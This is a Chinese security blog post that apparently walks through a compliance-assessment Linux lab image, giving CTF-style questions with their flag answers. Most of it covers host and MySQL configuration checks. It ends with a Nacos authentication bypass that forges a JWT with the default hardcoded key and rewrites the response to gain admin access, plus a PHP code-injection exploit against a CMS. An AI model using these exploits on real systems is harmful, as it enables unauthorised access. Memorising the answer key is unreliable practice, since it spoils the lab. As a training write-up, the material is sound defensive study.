#  学习干货|保姆式实战等保测评Linux镜像(邀请码+综合全流程+未公开漏洞)   
原创 爱州  州弟学安全   2024-06-26 19:00  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/icdGEWOnYLpNJUTyXhK4Iic6TJFLAAboGBK3V3tSviaWr4PZG8a6IYoiaMTg23QFLvasNxpQL1Ed9qLsPUmGPH1mPw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**0x01 前言**  
  
    在之前，我们对等保测评的自查理论步骤做出来总结，分为上中下三篇文章，后期应多位师傅的要求，又自作了Windows等保测评镜像，对各步骤进行了模块化梳理，此次我们对Linux进行复现，依旧是对各模块步骤梳理，主要是为了加深印象，关于既往文章点以下名片->关注->右下角学习干货->等保测评  
  
  
  
   ![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDq2yAed91Lib8oY7D3Yos2cH56MRHsd5miaHv81NZPQy3ic62TQ4tlBnmvg/640?wx_fmt=png&from=appmsg "")  
  
  
‍  
  
关于本次Linux环境配置如下，请确保本身环境符合，环境已PUSH至玄机平台，邀请码会在本文章留言区不定时发放，及时留意  
```
系统版本: Ubuntu 22.04.4
占用空间: 10G左右
网络配置: NAT模式
内存大小: 4G
CPU个数: 4
MYsql: 2个
docker: 1个
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqg1icBTCa6hEjyictCQ5vgU9VyeFVGUVvPGsV0aEFw5E7MlasbLJIKmUw/640?wx_fmt=png&from=appmsg "")  
******* 如您感觉本公众号文章质量不错，麻烦点个关注支持一下，只分享有用的知识**  
  
**0x02 测评过程**  
  
    Windows等保测评参考以下下文章，本次Linux技术测评自查结束暂告一段落  
  
[实战学习|保姆式实战等保测评Windows镜像(邀请码+全流程+未公开漏洞)](http://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&mid=2247485344&idx=1&sn=9e513e2aab080c39541f8585299cd6df&chksm=c27ca54ef50b2c5881213056da670b3c756c2f43798de8fe19a2371ac4382c3c1edfcfc76f05&scene=21#wechat_redirect)  
  
```
镜像下载地址: 
天翼网盘不限速: 
https://cloud.189.cn/t/eQvuIfqY3Irm （访问码：0hh8）
```  
```
主机账号: root
主机密码: dengbao123
小皮账号: admin
小皮密码: dengbao123
备: 小皮登录地址:http:ip:9080/48D41A/
MySQL账号: root  端口: 33060
MySQL密码: dengbao123
渗透WEB后台账号: admin
渗透WEB后台密码: password
题目
  ** 主机测评
    ** 查看相应文件，账户xiaoming的密码设定多久过期
    ** 查看相应文件，设置的密码到期规则是多少按照flag{提醒时间-最大时间}进行提交
    ** 已安装ssh，请提交当前SSH版本
    ** 对passwd及shadow文件权限分配进行权限值提交并提交是否合规如：644+true
    ** 结合相关知识检查在系统中存在可疑用户，进行提交用户名,多个用户名以+号连接
    ** 结合相关知识，对没有进行权限分离的用户进行提交
    ** 结合相关知识，提交审计日志功能状态
    ** 审计相关日志，查看zhangsan用户尝试使用sudo但登录失败的日志，提交其时间，如flag{Jun 23 00:39:52}
    ** 结合相关合规知识，提交相关系统内核版本
    ** 对开启的端口排查，结合应急响应知识，对开放的相关恶意端口进行提交
    ** 已知相应的WEB恶意端口，提交其隐藏文件中flag
  ** MySQL测评
    ** 结合相关知识，提交MySQL存在空口令风险的用户名，多个用户名已+连接
    ** 结合相关知识，对MySQL密码复杂度查询到的最小长度进行提交
    ** 结合相关知识，对MySQL登录最大失败次数查询并提交
    ** 结合相关知识，对MySQL超时返回最大时常进行提交(秒为单位)
    ** 结合相关知识，对MySQL锁定用户数量进行提交
    ** 提交MySQL全局日志状态 OFF或ON
    ** 提交当前MySQL数据库版本
  ** 漏洞扫描
    ** 利用/root/fscan/fscan进行漏洞扫描，对存在漏洞的端口进行提交，多个端口以+连接
    ** 根据找到其中的一个应用服务漏洞，提交数据中的flag
  ** 渗透测试
    ** 根据搭建服务端口12345进行渗透测试，提交命令执行的whoami回显
```  
  
**主机安全**  
```
问: 查看相应文件，账户xiaoming的密码设定多久过期
答: flag{7}
```  
  
    为了遵守用户的唯一标识，对用户权限神身份进行鉴别规则，对某些用户进行定时更新密码等是合规的一项，查看  
/etc/shad  
ow  
文件，使用以下命令看到xiaoming用户的密码是7天过期：  
cat /etc/shadow|grep xiaoming  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqCwjBE9Q7WNSZzhDZjjlxnibSIPibyHsUNa7QVI8fMibA5gdkuVJGFpgBA/640?wx_fmt=png&from=appmsg "")  
```
问: 查看相应文件，设置的密码到期规则是多少按照flag{提醒时间-最大时间}进行提交
答: flag{7-99999}
```  
  
    为了遵守安全合规性，在登录配置文件中，设置了密码最长与最短使用时间，包括提前多少天提醒用户更新密码设置，使用以下命令查看相应规则：  
cat /etc/login.defs可以  
在Password aging controls中  
查看并配置用户的密码过期规则，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqjHWCvwibjwrBMBEhicFqbCPGic6TibVFsyMMibLNPhHSdkqLFT4Wp5llssA/640?wx_fmt=png&from=appmsg "")  
```
关于登录次数错误限制及登录超时配置自行复现，因环境问题暂不复现
```  
```
问: 已安装ssh，请提交当前SSH版本
答: flag{OpenSSH_8.9p1}
```  
  
    为防止在远程传输过程中被窃听等行为，需查看相应端口和服务，如SSH，telnet等，SSH默认已开启，获取相应版本自行搜集版本是否存在漏洞即可，熟悉流程，命令为：  
ssh -V  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqO1T1yia2vGSms5fE9INPWiahdscFsAc3E6PribGsEamJBXLuSPPbSVDZg/640?wx_fmt=png&from=appmsg "")  
```
问: 对passwd及shadow文件权限分配进行权限值提交并提交是否合规如：644+true
答: flag{755+false}
```  
  
    为了实现对用户权限的访问控制，一般限制配置文件权限分配不超过644，可执行文件不超过755，此处以  
/etc/passwd  
及  
/  
etc/shadow文件做演示：  
ls -l /etc/passwd /etc/shadow  
，此处两个文件权限为755，所以为不合格  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqvXTSicV4o1zUoticReAPvFfMeYu4Pu6OcO0R32I393ialz2dn5lCYeHibQ/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关知识检查在系统中存在可疑用户，进行提交用户名,多个用户名以+号连接
答: flag{yunwei+wangwei}
```  
  
    此处应急响应的时候也可以用到，主要查看在用户家目录，root家目录，以及passwd和shadow文件的可疑用户和字段，此处我们查看  
/etc/passwd文件：  
cat /etc/passwd|grep home  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqWWqZ3ZL3iaQT9R8HCxDciaIxE8DCf3HUTyxRhMqicEDqCaFibgib4jnXuwA/640?wx_fmt=png&from=appmsg "")  
  
    一步步排查，先排查可登录用户，再排查用户的权限，发现用户yunwei和wangwei具有root权限，我们可以找到相关人员核实  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqibibDpUrrZowzWchAyLCyTbhA1pvCJBH9QaW5kaxQsdic5z06NxM9sv7w/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关知识，对没有进行权限分离的用户进行提交
答: flag{zhangsan}
```  
  
    前面我们已知存在的用户，并且对可疑权限的普通用户进行了查询并验证，此处我们继续延申，对于没有进行权限分离的用户查询，管理用户最小权限，实现权限分离：  
cat /etc/sudoers  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqsicqvU084qP7MVwgcIYWcNNa4Zib3TUNOmEon1TFFfKmwBNttD5d9E4A/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关知识，提交审计日志功能状态
答: flag{active}
```  
  
    对于日志审计功能，我们要求必须开启，且日志需要保留至少6个月以上，此处我们查询syslog是否开启，对日志开启状态进行提交：  
systemctl status syslog  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqXYsMtVicAfXVpX89B6MbB2VW9Ye2eZAHNJnUfsMk9CcXf3FMJ6YxfLg/640?wx_fmt=png&from=appmsg "")  
```
问: 审计相关日志，查看zhangsan用户尝试使用sudo但登录失败的日志，提交其时间，如flag{Jun 23 00:39:52}
答: flag{Jun 23 01:38:20}
```  
  
    日志文件为/var/log/auth.log文件，执行命令：  
  
    cat /var/log/auth.log|grep zhangsan  
```
我们可以看到，第一二行尝试创建zhangsan用户，并成功
第四五行尝试从root切换至zhangsna用户成功
第六行则是zhangsan用户尝试sudo至root用户，但失败
第七行sudo至root用户成功
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqSPS86KzqGMG2esG4j4ptGSMwIiaNia7rxYhibHd7oZuqzNicXgEiaLmF9tA/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关合规知识，提交相关系统内核版本
答: flag{5.15.0-112-generic}
```  
  
    需确认当前系统内核版本是否为最新或版本是否存在漏洞，执行：  
uname -a进行查看到内核版本，是否存在漏洞自行搜集  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDq19wwibqG6Vv6ZhTu9x9pRJIIKMBic9E8rbqibobfV9OU51DzkCjOxsXNg/640?wx_fmt=png&from=appmsg "")  
```
问: 对开启的端口排查，结合应急响应知识，对开放的相关恶意端口进行提交
答: flag{5566}
```  
  
    此处需要利用到应急响应知识，首先执行命令：  
netstat -lntp 查看到开放的端口，依次排查相应程序  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqicBBr0OyUQtp4gfiaiaURYPhQskslJno2ESCaFj902xqeibVX7QkBQhuhg/640?wx_fmt=png&from=appmsg "")  
  
    已知8090和9080为小皮面板，PHP study搭建，WEB服务直接登录PHP study即可，输入命令：  
xp，然后输入  
6查看到面板信息，根据给到的账号密码登录进行排查即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqtUmB4cFavKibnGXe5GqZrCHTiaWqQSwwqesaH1WcBe8nu9tZUDmGN5Xg/640?wx_fmt=png&from=appmsg "")  
  
    复制给到的url链接，玄机直接复制外网链接即可，输入账号密码登录，点击网站可以查看所有对外映射站点，查看站点目录文件及端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqxg6yvRXEg9JIlDlvuXcu1h5sj9ibhzV5xibAWzH1H6CpENS3qqqOdh1Q/640?wx_fmt=png&from=appmsg "")  
  
    看到  
5566  
端口相应WEB目录下  
/www/admin/hacker/index.php  
文件存在一句话木马执行，执行前会检查UA，不是对应UA则不执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqLamurzfhSa6vB9pq01g7SNg4qJm9l4YBd4NI3lwicRcntYaZoS0jQyg/640?wx_fmt=png&from=appmsg "")  
```
问: 已知相应的WEB恶意端口，提交其隐藏文件中flag
答: flag{7815696ecbf1c96e6894b779456d330e}
```  
  
    在Linux中需执行  
ls -a查看隐藏文件，及.xxx的文件，在小皮面板直接点击编辑查看即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqly2dyRC1gGcvPqaNW44n6FJ5EqQRucXKAcKHXoqXUoaZTmafy8eUnQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqofe1sE3Ociabdn4RfByibejl2vXGmic9oA64IZBAFlxkVR0ODNnGumUPg/640?wx_fmt=png&from=appmsg "")  
  
    可以看到隐藏文件中的一句话木马的密码是MD5，作为flag提交即可  
  
**MySQL安全测评**  
  
    此处注意，MySQL端口为33060，已在文章处标注，3306为小皮搭建，无法远程控制，此处推荐使用远程连接的方式进行控制，或熟悉docker的师傅可以进入对应容器进行操作，此处我使用Navicat   
```
问: 结合相关知识，提交MySQL存在空口令风险的用户名，多个用户名已+连接
答: flag{yunwei}
```  
  
    MySQL对应版本为8.0，我们执行：  
select user,authentication_string from mysql.user 查询到空口令的用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDq2XUge2Tz0IWicxwzDQQXtozHCTMU6eV3G7dtOvEpN2RaTSb9qMKhq6w/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关知识，对MySQL密码复杂度查询到的最小长度进行提交
答: flag{8}
```  
  
    应等保合规性要求，密码复杂度需要一定配置，默认情况下MySQL是没有装载相关插件的，在既往文章我也进行了总结，如何装载及查询，此处已进行装载插件，我们进行查询：  
show variables like 'validate%';  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqXbKOslNkic7TGdcsqkbGxLXUQKjetk5qmS5xpqSialuSiaqfhRGXoiagwQ/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关知识，对MySQL登录最大失败次数查询并提交
答: flag{3}
```  
  
      
为了防止暴力破解及合规性要求，需设置密码错误次数后冻结等操作，此处已进行装载插件，执行命令查询：  
show variables like '%connection_control%';  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqXx0z0LyFK7Js9Boiagzqvib0AtsMacOpXUQicL4xzBlqUiadr1ocXibVibiaA/640?wx_fmt=png&from=appmsg "")  
  
    可以看到最多允许账号登陆时密码错误3次，实际可根据要求进行配置  
```
问: 结合相关知识，对MySQL超时返回最大时常进行提交(秒为单位)
答: flag{28800}
```  
  
   
   为防止远程连接超时，连接时长时间不操作及可能被窃取会话可能，包括合规性检查，我们需设置并检查超时最大时间容忍上限：  
show variables like "%timeout%";  
 并对时间进行提交  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqZicNx2myeWlyZ6cgicPtoXuuTCicK2asusFITFduRZ2OJtLFEB3xibBxwQ/640?wx_fmt=png&from=appmsg "")  
```
问: 结合相关知识，对MySQL锁定用户数量进行提交
答: flag{3}
```  
  
    为了对合规性满足要求，以及是否在运维本身不知情的情况下，MySQL某些用户存在开启状态，从而可能造成危害：  
select user,account_locked from mysql.user;  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqshrRXzmaT3KeKftNdSBVB83rxEFgh5BF2lGzyLPWugTePgUUT9nUVw/640?wx_fmt=png&from=appmsg "")  
```
问: 提交MySQL全局日志状态 OFF或ON
答: flag{OFF}
```  
  
    应对合规性要求，相关日志功能需要开启且日志需保留至少6个月，需要检查相关功能是否开启且正常：  
select user,account_locked from mysql.user;  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDq6B7K2HaNI1TJdINhN38NjWsIzeEWibwZ61yVS6lOpNI1y1KAA2UhgSQ/640?wx_fmt=png&from=appmsg "")  
```
问: 提交当前MySQL数据库版本
答: flag{8.0.27}
```  
  
    因为使用的是docker搭建的，命令行查询需进入容器内部，执行命令：  
docker ps，然后执行   
docker exec -it e7 bash，进入后执行  
mysql --version查询到版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqfD0c3ZQQtaITQH1fDgzgvm2pofiaxT4ibYIgnz0KngHqC3p9icDu2uib8g/640?wx_fmt=png&from=appmsg "")  
  
    在MySQL内部使用命令查询到版本：  
select @@version;   
或  
select version();  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqjUO7pACibBlMibKYttiappbMT7ic9G8bEb6VvtextQmRW0YsnNtz0b95SA/640?wx_fmt=png&from=appmsg "")  
  
**漏洞扫描**  
  
    漏洞扫描是等保测评的一部分，我们此处只进行模拟，在正常情况下，需使用国产承认漏扫设备或软件工具进行扫描出具报告，在系统中开启了相关的业务，但是由于开发的问题，未进行安全测试，直接搭建上线了，我们使用  
/root/fscan/fscan进行扫描本地  
127.0.0.1存在的漏洞进行验证  
```
问: 利用/root/fscan/fscan进行漏洞扫描，对存在漏洞的端口进行提交，多个端口以+连接
答: flag{6379+8848}
```  
  
    执行命令：  
./fscan -h 127.0.0.1  
 看到扫描出存在漏洞的端口为  
8848/nacos  
服务以及  
6379/redis  
存在的弱口令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDquJ0SiaNZsOZNraNUdtzvyEibAcRm3jEnvMcu9feykXE5zYUxR5FFpX0A/640?wx_fmt=png&from=appmsg "")  
  
     redis弱口令为123456，我们执行  
redis-cli -h 127.0.0.1  
登录验证成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqPmBwPic8KcBpwViaicdic07cGuSgFW1ELee4wmpf7HhLtfHgEiacOMXlZLQ/640?wx_fmt=png&from=appmsg "")  
```
问: 根据找到其中的一个应用服务漏洞，提交数据中的flag
答: flag{636ce4dc544036142a8e05a686b5c27e}
```  
  
    此处在正常渗透测试和漏洞挖掘过程有关联，在已知开放的端口且扫描出漏洞的情况下，需了解相关服务的作用，已知nacos存在权限绕过漏洞，我们利用此漏洞进行绕过  
  
    权限绕过因为它的key是写死的，默认key如下，访问https://jwt.io/  
```
SecretKey012345678901234567890123456789012345678901234567890123456789
```  
  
   
   输入默认key，然后将以下payload输入至payload框中，时间戳需大于你当前时间 https://tool.lu/timestamp/  
```
{
  "sub": "nacos",
  "exp": 1711208512
}
```  
  
    我这里生成了一个第二天的时间戳，然后替换到payload的exp中生成jwt编码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqrAxgXqQWLibSic5sclzPMpk0NqxUqogVo8TFrTib46v0GCHXjEI3vajJg/640?wx_fmt=png&from=appmsg "")  
  
    接着返回至nacos登录处，抓取登录请求包，正常来说应该是403响应  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqmHvV3K27UqmrDKWrVX5ibJibicjGBs421STiatD2JVdZuo1uIXwZoZCuxg/640?wx_fmt=png&from=appmsg "")  
  
    重新抓取登录请求包，将响应包改为以下内容，其中accessToken为刚刚生成的jwt编码，接着一直放包，即可进入nacos系统，完成权限绕过漏洞  
```
HTTP/1.1 200 
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMTIwODUxMn0.VE7vbwmpnUVLq8rvE8uZse37tpCvoTWX-9gtp4OoHQk
Content-Type: application/json;charset=UTF-8
Date: Wed, 08 Mar 2023 10:39:56 GMT
Connection: close
Content-Length: 162

{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxOTQ3NjAwNX0.6hiSbB9giLJNbBHtwTvj7QtMY5eRpjDT3v9FlIl8g6E","tokenTtl":18000,"globalAdmin":true}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqB7ROMFB4kJibh2h2L8Of5V2xZrCavKb8CjWtxmR6zHDYkzNkbrzFGqA/640?wx_fmt=png&from=appmsg "")  
  
    在配置列表中，Data ID名为fff的配置项，点击详情，查看到敏感信息，此处以flag代替  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqu5K2Ik3wIY5mZvtdWGEiasnF80DH31QJshf0TwCm4Dm7469oYjI5NLQ/640?wx_fmt=png&from=appmsg "")  
  
**渗透测试**  
  
    此处使用小皮面板搭建，相应WEB渗透端口为  
12345，渗透测试作为等保的一部分，需进行黑白盒测试，即为常见漏洞攻击和代码审计等，此处我们根据未公开漏洞：某CMS出现的代码执行漏洞进行复现，环境提供鸣谢道一安全  
  
```
相关分析文档下载地址:
https://ckxkzyk.lanzouo.com/iBw9m22s6ygj
```  
  
*** 技术仅供分享参考学习，请勿非法使用，违者后果自负**  
```
问: 根据搭建服务端口12345进行渗透测试，提交命令执行的whoami回显包
答: flag{www}
```  
  
    我们根据道一师傅给出的漏洞思路进行复现，开启缓存后，点击发布文章，抓包后找到info参数，此时需要将恶意代码进行url编码以绕过前端过滤  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqiaA8gCtACwRTshgfgax78RSaoZnWQyvzlba8YPhr58o9VU8yial22Y0w/640?wx_fmt=png&from=appmsg "")  
  
    题目要求，需要获取whoami的回显包，这里我用的：  
<?php system(whoami); ?>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqlZ2BaAzgTomLNic9UQqmgJPOrwKUZFzcDUcMSQEkeHf63A8sYysRdCQ/640?wx_fmt=png&from=appmsg "")  
  
    然后将url编码替换掉info的的数据，放包后文章写入成功，这时候需要访问前台，在前台页面访问创建的那个文章以产生缓存，此时因开启了缓存，会将此代码以php的方式写入到wen目录下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqe6KF10LzagErayMSLgyIrjCzL7R5MJ2wCJMCnW6WyJjHYChDHrhyeA/640?wx_fmt=png&from=appmsg "")  
  
    我们将图中的11.html改为11.php即可获取到命令执行的结果，权限为www  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqgbqVPx43vq9sOqwxWnpexo8jiaC0rG9o5HXibMQOE6Nz6XuJEvjPaNicA/640?wx_fmt=png&from=appmsg "")  
  
**0x03 结语**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpMZByJOhtKEoQicia3ic6eQhDqg1icBTCa6hEjyictCQ5vgU9VyeFVGUVvPGsV0aEFw5E7MlasbLJIKmUw/640?wx_fmt=png&from=appmsg "")  
  
    本篇文章我们通过主机测评安全以及数据库测评安全+漏洞扫描模块和渗透测试模块，以实战为目的，中间介入应急响应知识和渗透模块知识，以多发出问题：学这个为什么，学这个有什么用为目的去演示，当然，在实战中注意事项会更对，既要满足安全的合规性，又要对系统了解得到，总而言之，网络安全需要学的多而杂，各路知识联动使用，多思考多学习  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/icdGEWOnYLpNFmaibjiblRPm0aA0rnNUZqJvJrp9GeQ5c8bRZRxdeXJnIFRic8RGuTKycd8meXcoRibTpzMmaGrvjiag/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
